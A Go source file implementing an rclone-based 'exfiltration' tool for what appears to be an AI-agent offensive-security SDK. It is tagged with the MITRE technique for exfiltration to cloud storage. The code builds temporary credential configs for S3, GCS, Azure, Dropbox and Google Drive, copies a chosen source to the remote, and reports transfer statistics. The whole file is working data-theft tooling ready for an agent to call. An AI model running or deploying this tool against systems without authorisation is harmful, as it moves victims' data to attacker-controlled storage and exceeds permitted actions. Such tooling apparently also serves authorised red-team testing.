package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"

	sdkexec "github.com/zero-day-ai/sdk/exec"
	"github.com/zero-day-ai/sdk/tool"
	"github.com/zero-day-ai/sdk/types"
)

const (
	ToolName        = "rclone"
	ToolVersion     = "1.0.0"
	ToolDescription = "Cloud storage exfiltration tool supporting S3, GCS, Azure, Dropbox, and Google Drive"
	BinaryName      = "rclone"
)

// ToolImpl implements the rclone tool
type ToolImpl struct{}

// NewTool creates a new rclone tool instance
func NewTool() tool.Tool {
	cfg := tool.NewConfig().
		SetName(ToolName).
		SetVersion(ToolVersion).
		SetDescription(ToolDescription).
		SetTags([]string{
			"exfiltration",
			"T1567.002", // Exfiltration to Cloud Storage
			"cloud",
			"data-transfer",
		}).
		SetInputSchema(InputSchema()).
		SetOutputSchema(OutputSchema()).
		SetExecuteFunc((&ToolImpl{}).Execute)

	t, _ := tool.New(cfg)
	return &toolWithHealth{Tool: t, impl: &ToolImpl{}}
}

// toolWithHealth wraps the tool to add custom health checks
type toolWithHealth struct {
	tool.Tool
	impl *ToolImpl
}

func (t *toolWithHealth) Health(ctx context.Context) types.HealthStatus {
	return t.impl.Health(ctx)
}

// Execute implements the rclone tool execution
func (t *ToolImpl) Execute(ctx context.Context, input map[string]any) (map[string]any, error) {
	// Extract required parameters
	source, _ := input["source"].(string)
	destination, _ := input["destination"].(string)
	provider, _ := input["provider"].(string)
	configMap, _ := input["config"].(map[string]any)

	if source == "" || destination == "" || provider == "" {
		return nil, fmt.Errorf("source, destination, and provider are required")
	}

	// Create temporary config file
	configFile, err := t.createConfigFile(provider, configMap)
	if err != nil {
		return nil, fmt.Errorf("failed to create rclone config: %w", err)
	}
	defer os.Remove(configFile)

	// Build rclone command
	args := []string{
		"--config", configFile,
		"copy",
		source,
		destination,
		"--stats-one-line",
		"--stats", "1s",
		"-v",
	}

	// Execute rclone
	result, err := sdkexec.Run(ctx, sdkexec.Config{
		Command: BinaryName,
		Args:    args,
		Timeout: 0, // No timeout, let context handle cancellation
	})

	if err != nil {
		return nil, fmt.Errorf("rclone execution failed: %w", err)
	}

	if result.ExitCode != 0 {
		return nil, fmt.Errorf("rclone failed with exit code %d: %s", result.ExitCode, string(result.Stderr))
	}

	// Parse output for statistics
	output := string(result.Stderr) // rclone writes stats to stderr
	stats, err := t.parseStats(output)
	if err != nil {
		return nil, fmt.Errorf("failed to parse rclone output: %w", err)
	}

	// Add destination URL to output
	stats["destination_url"] = destination

	return stats, nil
}

// Health checks if rclone binary is available
func (t *ToolImpl) Health(ctx context.Context) types.HealthStatus {
	_, err := exec.LookPath(BinaryName)
	if err != nil {
		return types.NewUnhealthyStatus(
			fmt.Sprintf("%s binary not found in PATH", BinaryName),
			map[string]any{"error": err.Error()},
		)
	}

	return types.NewHealthyStatus(fmt.Sprintf("%s is available", BinaryName))
}

// createConfigFile creates a temporary rclone config file with provider credentials
func (t *ToolImpl) createConfigFile(provider string, config map[string]any) (string, error) {
	// Create temp directory
	tempDir, err := os.MkdirTemp("", "rclone-config-*")
	if err != nil {
		return "", err
	}

	configFile := filepath.Join(tempDir, "rclone.conf")

	var configContent string

	switch provider {
	case "s3":
		configContent = t.buildS3Config(config)
	case "gcs":
		configContent = t.buildGCSConfig(config)
	case "azure":
		configContent = t.buildAzureConfig(config)
	case "dropbox":
		configContent = t.buildDropboxConfig(config)
	case "gdrive":
		configContent = t.buildGDriveConfig(config)
	default:
		os.RemoveAll(tempDir)
		return "", fmt.Errorf("unsupported provider: %s", provider)
	}

	if err := os.WriteFile(configFile, []byte(configContent), 0600); err != nil {
		os.RemoveAll(tempDir)
		return "", err
	}

	return configFile, nil
}

// buildS3Config creates S3 configuration
func (t *ToolImpl) buildS3Config(config map[string]any) string {
	accessKey, _ := config["access_key_id"].(string)
	secretKey, _ := config["secret_access_key"].(string)
	region, _ := config["region"].(string)
	endpoint, _ := config["endpoint"].(string)

	if region == "" {
		region = "us-east-1"
	}

	var lines []string
	lines = append(lines, "[remote]")
	lines = append(lines, "type = s3")
	lines = append(lines, "provider = AWS")
	lines = append(lines, fmt.Sprintf("access_key_id = %s", accessKey))
	lines = append(lines, fmt.Sprintf("secret_access_key = %s", secretKey))
	lines = append(lines, fmt.Sprintf("region = %s", region))

	if endpoint != "" {
		lines = append(lines, fmt.Sprintf("endpoint = %s", endpoint))
	}

	return strings.Join(lines, "\n")
}

// buildGCSConfig creates Google Cloud Storage configuration
func (t *ToolImpl) buildGCSConfig(config map[string]any) string {
	credentials, _ := config["service_account_credentials"].(string)
	projectNumber, _ := config["project_number"].(string)

	var lines []string
	lines = append(lines, "[remote]")
	lines = append(lines, "type = google cloud storage")

	if credentials != "" {
		lines = append(lines, fmt.Sprintf("service_account_credentials = %s", credentials))
	}

	if projectNumber != "" {
		lines = append(lines, fmt.Sprintf("project_number = %s", projectNumber))
	}

	return strings.Join(lines, "\n")
}

// buildAzureConfig creates Azure Blob Storage configuration
func (t *ToolImpl) buildAzureConfig(config map[string]any) string {
	account, _ := config["account"].(string)
	key, _ := config["key"].(string)

	var lines []string
	lines = append(lines, "[remote]")
	lines = append(lines, "type = azureblob")
	lines = append(lines, fmt.Sprintf("account = %s", account))
	lines = append(lines, fmt.Sprintf("key = %s", key))

	return strings.Join(lines, "\n")
}

// buildDropboxConfig creates Dropbox configuration
func (t *ToolImpl) buildDropboxConfig(config map[string]any) string {
	token, _ := config["dropbox_token"].(string)

	var lines []string
	lines = append(lines, "[remote]")
	lines = append(lines, "type = dropbox")
	lines = append(lines, fmt.Sprintf("token = %s", token))

	return strings.Join(lines, "\n")
}

// buildGDriveConfig creates Google Drive configuration
func (t *ToolImpl) buildGDriveConfig(config map[string]any) string {
	clientID, _ := config["client_id"].(string)
	clientSecret, _ := config["client_secret"].(string)
	token, _ := config["gdrive_token"].(string)

	var lines []string
	lines = append(lines, "[remote]")
	lines = append(lines, "type = drive")
	lines = append(lines, fmt.Sprintf("client_id = %s", clientID))
	lines = append(lines, fmt.Sprintf("client_secret = %s", clientSecret))

	if token != "" {
		lines = append(lines, fmt.Sprintf("token = %s", token))
	}

	return strings.Join(lines, "\n")
}

// parseStats extracts transfer statistics from rclone output
func (t *ToolImpl) parseStats(output string) (map[string]any, error) {
	stats := map[string]any{
		"transferred":   0,
		"files_count":   0,
		"transfer_rate": "0 Bytes/s",
	}

	// Find the last stats line
	lines := strings.Split(output, "\n")
	var lastStatsLine string

	for _, line := range lines {
		if strings.Contains(line, "Transferred:") {
			lastStatsLine = line
		}
	}

	if lastStatsLine == "" {
		// Try to count files from output
		fileCountRe := regexp.MustCompile(`(\d+) / (\d+), `)
		if matches := fileCountRe.FindStringSubmatch(output); len(matches) > 2 {
			if count, err := strconv.Atoi(matches[1]); err == nil {
				stats["files_count"] = count
			}
		}
		return stats, nil
	}

	// Parse transferred bytes
	// Format: "Transferred:   	  123.456 MBytes / 123.456 MBytes, 100%, 1.234 MBytes/s, ETA 0s"
	transferredRe := regexp.MustCompile(`Transferred:\s+([0-9.]+)\s*([KMG]?Bytes)`)
	if matches := transferredRe.FindStringSubmatch(lastStatsLine); len(matches) > 2 {
		value, _ := strconv.ParseFloat(matches[1], 64)
		unit := matches[2]

		// Convert to bytes
		var multiplier float64
		switch unit {
		case "Bytes":
			multiplier = 1
		case "KBytes":
			multiplier = 1024
		case "MBytes":
			multiplier = 1024 * 1024
		case "GBytes":
			multiplier = 1024 * 1024 * 1024
		}

		stats["transferred"] = int(value * multiplier)
	}

	// Parse transfer rate
	rateRe := regexp.MustCompile(`([0-9.]+\s*[KMG]?Bytes/s)`)
	if matches := rateRe.FindStringSubmatch(lastStatsLine); len(matches) > 1 {
		stats["transfer_rate"] = matches[1]
	}

	// Parse file count
	// Look for patterns like "Transferred: 5 / 10"
	fileCountRe := regexp.MustCompile(`Transferred:\s+(\d+)\s*/\s*(\d+)`)
	if matches := fileCountRe.FindStringSubmatch(output); len(matches) > 2 {
		if count, err := strconv.Atoi(matches[1]); err == nil {
			stats["files_count"] = count
		}
	}

	return stats, nil
}
